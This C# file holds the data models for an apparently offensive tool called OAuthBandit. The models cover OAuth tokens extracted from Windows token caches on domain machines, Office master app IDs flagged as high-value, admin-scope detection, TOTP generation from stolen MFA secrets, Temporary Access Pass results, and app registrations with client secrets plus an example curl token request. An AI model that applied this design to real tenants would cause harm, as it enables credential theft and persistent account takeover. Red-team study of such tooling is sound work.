using System.Text.Json.Serialization;

namespace OAuthBandit.Core;

public class Token
{
    public string TokenType { get; set; } = "";
    public string TokenValue { get; set; } = "";
    public string Application { get; set; } = "";
    public string? ClientId { get; set; }
    public string? Upn { get; set; }
    public string? TenantId { get; set; }
    public string? Scope { get; set; }
    public string SourceFile { get; set; } = "";
    public string? CachePath { get; set; }
    public bool IsPrtBound { get; set; }
    public string ExtractedAt { get; set; } = "";
    public string? ExpiresAt { get; set; }
    public bool IsExpired { get; set; }
    public string? DisplayName { get; set; }
    public string? UserOid { get; set; }
    public string? Audience { get; set; }
    public string? SessionKey { get; set; }
    public bool IsOfficeMaster { get; set; }
    public string? SourceType { get; set; }

    // Office Master AppIDs - high-value tokens
    private static readonly string[] OfficeMasterAppIds = {
        "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        "d3590ed6-52b1-4102-aeff-aad2292ab01c"
    };

    [JsonIgnore]
    public bool IsGraphToken => Audience != null && Audience.Contains("graph.microsoft.com", StringComparison.OrdinalIgnoreCase);

    public void CheckOfficeMaster()
    {
        IsOfficeMaster = !string.IsNullOrEmpty(ClientId) && OfficeMasterAppIds.Contains(ClientId);
    }

    public Dictionary<string, object?> ToOutputDict() => new()
    {
        ["type"] = TokenType,
        ["application"] = Application,
        ["client_id"] = ClientId,
        ["scope"] = Scope,
        ["value"] = TokenValue,
        ["expires_at"] = ExpiresAt,
        ["is_prt_bound"] = IsPrtBound,
        ["is_office_master"] = IsOfficeMaster,
        ["source_type"] = SourceType,
        ["session_key"] = SessionKey
    };
}

public class TokenResponse
{
    public string AccessToken { get; set; } = "";
    public string? RefreshToken { get; set; }
    public string TokenType { get; set; } = "Bearer";
    public int ExpiresIn { get; set; } = 3600;
    public string Scope { get; set; } = "";
    public string? IdToken { get; set; }

    public bool HasAdminScope
    {
        get
        {
            string[] indicators = { "Directory.ReadWrite", "RoleManagement", "UserAuthenticationMethod.ReadWrite.All", "Policy.ReadWrite" };
            return indicators.Any(s => Scope.Contains(s, StringComparison.OrdinalIgnoreCase));
        }
    }
}

public class TOTPSecret
{
    public string SecretKey { get; set; } = "";
    public string OtpUri { get; set; } = "";
    public string MethodId { get; set; } = "";
    public string UserId { get; set; } = "";
    public string DisplayName { get; set; } = "";

    public string GenerateCode(long? timestamp = null)
    {
        timestamp ??= DateTimeOffset.UtcNow.ToUnixTimeSeconds();
        long timeStep = timestamp.Value / 30;
        var key = Base32Decode(SecretKey);
        var msg = BitConverter.GetBytes(timeStep);
        if (BitConverter.IsLittleEndian) Array.Reverse(msg);
        using var hmac = new System.Security.Cryptography.HMACSHA1(key);
        var hash = hmac.ComputeHash(msg);
        int offset = hash[^1] & 0x0F;
        int code = ((hash[offset] & 0x7F) << 24) | (hash[offset + 1] << 16) | (hash[offset + 2] << 8) | hash[offset + 3];
        return (code % 1000000).ToString("D6");
    }

    private static byte[] Base32Decode(string input)
    {
        input = input.ToUpperInvariant().TrimEnd('=');
        const string alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        var bits = new List<byte>();
        foreach (char c in input)
        {
            int val = alphabet.IndexOf(c);
            if (val < 0) continue;
            for (int i = 4; i >= 0; i--) bits.Add((byte)((val >> i) & 1));
        }
        var result = new byte[bits.Count / 8];
        for (int i = 0; i < result.Length; i++)
            result[i] = (byte)(bits[i * 8] << 7 | bits[i * 8 + 1] << 6 | bits[i * 8 + 2] << 5 |
                                bits[i * 8 + 3] << 4 | bits[i * 8 + 4] << 3 | bits[i * 8 + 5] << 2 |
                                bits[i * 8 + 6] << 1 | bits[i * 8 + 7]);
        return result;
    }
}

public class TAPResult
{
    public string TapCode { get; set; } = "";
    public string UserId { get; set; } = "";
    public string Upn { get; set; } = "";
    public int LifetimeMinutes { get; set; }
    public bool IsUsableOnce { get; set; }
    public string CreatedAt { get; set; } = "";
    public string ExpiresAt { get; set; } = "";
    public string MethodId { get; set; } = "";
}

public class AppRegistration
{
    public string AppId { get; set; } = "";
    public string ClientId { get; set; } = "";
    public string ClientSecret { get; set; } = "";
    public string TenantId { get; set; } = "";
    public string DisplayName { get; set; } = "";
    public string ObjectId { get; set; } = "";
    public List<string> Permissions { get; set; } = new();
    public string CreatedAt { get; set; } = "";
    public string SecretExpiresAt { get; set; } = "";

    public Dictionary<string, object> ToDict() => new()
    {
        ["app_name"] = DisplayName,
        ["app_object_id"] = ObjectId,
        ["client_id"] = ClientId,
        ["client_secret"] = ClientSecret,
        ["tenant_id"] = TenantId,
        ["permissions"] = Permissions,
        ["created_at"] = CreatedAt,
        ["secret_expires_at"] = SecretExpiresAt,
        ["usage"] = new Dictionary<string, string>
        {
            ["token_endpoint"] = $"https://login.microsoftonline.com/{TenantId}/oauth2/v2.0/token",
            ["grant_type"] = "client_credentials",
            ["scope"] = "https://graph.microsoft.com/.default",
            ["example_curl"] = $"curl -X POST https://login.microsoftonline.com/{TenantId}/oauth2/v2.0/token -d 'client_id={ClientId}&client_secret={ClientSecret}&grant_type=client_credentials&scope=https://graph.microsoft.com/.default'"
        }
    };
}

public class DomainComputer
{
    public string Name { get; set; } = "";
    public string DnsHostname { get; set; } = "";
    public string OperatingSystem { get; set; } = "";
    public bool Enabled { get; set; }
}

public class MachineResult
{
    public string Hostname { get; set; } = "";
    public string Ip { get; set; } = "";
    public string Status { get; set; } = "pending";
    public int UsersFound { get; set; }
    public int TbresFiles { get; set; }
    public int WamFiles { get; set; }
    public int TokensExtracted { get; set; }
    public int RefreshTokens { get; set; }
    public int AccessTokens { get; set; }
    public string? Error { get; set; }
    public double DurationSeconds { get; set; }
    public List<Dictionary<string, object>> Users { get; set; } = new();
}
